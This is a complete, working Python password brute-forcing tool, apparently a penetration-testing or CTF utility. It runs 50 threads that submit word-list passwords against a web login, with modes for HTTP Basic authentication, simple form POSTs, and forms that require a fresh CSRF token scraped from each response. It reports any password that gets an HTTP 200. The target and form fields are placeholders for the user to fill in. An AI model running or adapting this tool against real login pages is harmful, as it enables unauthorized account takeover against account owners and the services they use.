#!/usr/bin/env python3
import argparse
import queue
import requests
import sys
import threading
import time
import base64
import bs4

THREAD_COUNT = 50
THREAD_SLEEP_SECONDS = 0
USER_AGENT = "Mozilla/5.0 (X11; Linux x86_64; rv:19.0) Gecko/20100101 Firefox/19.0"

BASE_URL = "http://localhost"
USE_BASIC_AUTH = True
LOGIN_PAGE_GET_URL = "/index.html"
LOGIN_PAGE_POST_URL = ""

INCLUDE_CSRF_TOKEN = False and not USE_BASIC_AUTH
CSRF_TOKEN_HTML_ELEMENT = "" # ex. "input[name=\"csrf_token\"]" - see bs4 documentation!

USERNAME_FIELD_NAME = ""
PASSWORD_FIELD_NAME = ""
CSRF_TOKEN_FIELD_NAME = ""

ALLOW_REDIRECTS = True

CONNECTION_ERROR_MSG = "An error occurred while sending request!"

passwords = []


def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--username", dest="username", type=str, required=True)
    parser.add_argument("-w", "--word-lists", dest="word_lists", nargs="+", type=str, required=True)

    return parser.parse_args()


def get_request_headers_post() -> dict:
    headers = {
        "User-Agent": USER_AGENT,
        "Content-Type": "application/x-www-form-urlencoded"
    }

    return headers


def get_request_headers_get() -> dict:
    headers = {
        "User-Agent": USER_AGENT
    }

    return headers


def get_csrf_token(response_body) -> str:
    if response_body is None:
        return ""

    soup = bs4.BeautifulSoup(response_body, "html.parser")
    csrf_token_element = soup.select_one(CSRF_TOKEN_HTML_ELEMENT)
    if csrf_token_element is None:
        return ""
    csrf_token = csrf_token_element.get("value")

    return csrf_token


def get_words(word_lists) -> list:
    words = []
    for word_list in word_lists:
        with open(word_list, "r") as open_word_list:
            words.extend([line.strip() for line in open_word_list.readlines()])

    return words


def create_words_queue(words) -> queue.Queue:
    words_queue = queue.Queue()
    [words_queue.put(w) for w in words]

    return words_queue


def create_request_body(username, password, csrf_token=None) -> dict:
    body = {
        USERNAME_FIELD_NAME: username,
        PASSWORD_FIELD_NAME: password
    }

    if csrf_token is not None:
        body[CSRF_TOKEN_FIELD_NAME] = csrf_token

    return body


def is_request_successful(response) -> bool:
    # Add or change criterias for a successful response, e.g. a status code, page title
    return response.status_code == 200


def are_passwords_found() -> bool:
    global passwords
    return len(passwords) > 0


def try_passwords_form_with_csrf_token(word_queue, username):
    global passwords
    with requests.Session() as session:
        response = session.get(
            f"{BASE_URL}{LOGIN_PAGE_GET_URL}",
            headers=get_request_headers_get(),
            allow_redirects=ALLOW_REDIRECTS)
        csrf_token = get_csrf_token(response.content.decode())
        if csrf_token == "":
            raise Exception("CSRF token was not found in the response!")
        while not word_queue.empty() and not are_passwords_found():
            password = word_queue.get()
            request_body = create_request_body(username, password, csrf_token)
            try:
                response = session.post(
                    f"{BASE_URL}{LOGIN_PAGE_POST_URL}",
                    data=request_body,
                    headers=get_request_headers_post(),
                    allow_redirects=ALLOW_REDIRECTS)

                if is_request_successful(response):
                    print(f"Found password: {password}")
                    passwords.append(password)
                else:
                    print(f"{password} => {response.status_code}")
                csrf_token = get_csrf_token(response.content.decode())
            except requests.exceptions.ConnectionError:
                sys.stderr.write(CONNECTION_ERROR_MSG)
                sys.stderr.flush()
                continue
            finally:
                time.sleep(THREAD_SLEEP_SECONDS)


def try_passwords_simple_form(word_queue, username):
    global passwords
    with requests.Session() as session:
        while not word_queue.empty() and not are_passwords_found():
            password = word_queue.get()
            request_body = create_request_body(username, password)
            try:
                response = session.post(
                    f"{BASE_URL}{LOGIN_PAGE_POST_URL}",
                    data=request_body,
                    headers=get_request_headers_post(),
                    allow_redirects=ALLOW_REDIRECTS)

                if is_request_successful(response):
                    print(f"Found password: {password}")
                    passwords.append(password)
                else:
                    print(f"{password} => {response.status_code}")
            except requests.exceptions.ConnectionError:
                sys.stderr.write(CONNECTION_ERROR_MSG)
                sys.stderr.flush()
                continue
            finally:
                time.sleep(THREAD_SLEEP_SECONDS)


def create_base64_string(username, password) -> str:
    str_bytes = f"{username}:{password}".encode('ascii')
    return base64.b64encode(str_bytes).decode()


def try_passwords_basic_auth(word_queue, username):
    global passwords
    with requests.Session() as session:
        while not word_queue.empty() and not are_passwords_found():
            password = word_queue.get()
            try:
                headers = get_request_headers_get()
                headers["Authorization"] = f"Basic {create_base64_string(username, password)}"
                response = session.get(
                    f"{BASE_URL}{LOGIN_PAGE_GET_URL}",
                    headers=headers,
                    allow_redirects=ALLOW_REDIRECTS)

                if is_request_successful(response):
                    print(f"Found password: {password}")
                    passwords.append(password)
                else:
                    print(f"{password} => {response.status_code}")
            except requests.exceptions.ConnectionError:
                sys.stderr.write(CONNECTION_ERROR_MSG)
                sys.stderr.flush()
                continue
            finally:
                time.sleep(THREAD_SLEEP_SECONDS)


def main():
    try:
        global passwords
        arguments = parse_arguments()
        print("Reading passwords from wordlists...")
        words = get_words(arguments.word_lists)
        word_queue = create_words_queue(words)

        if INCLUDE_CSRF_TOKEN:
            print("POST requests including CSRF tokens selected!")
            request_method = try_passwords_form_with_csrf_token
        elif USE_BASIC_AUTH:
            print("Basic authentication selected!")
            request_method = try_passwords_basic_auth
        else:
            print("Simple POST requests selected!")
            request_method = try_passwords_simple_form

        print(f"Make sure the different parameters are configured correctly for the selected method!")
        print(f"{word_queue.qsize()} words read from files. Press return to start...")
        sys.stdin.readline()

        threads = []
        for _ in range(THREAD_COUNT):
            t = threading.Thread(target=request_method, args=(word_queue, arguments.username, ))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        print("Script finished!")
        if are_passwords_found():
            print(f"Passwords found for user {arguments.username}: {passwords}")

    except Exception as ex:
        print(ex)
        sys.exit(1)


if __name__ == '__main__':
    main()
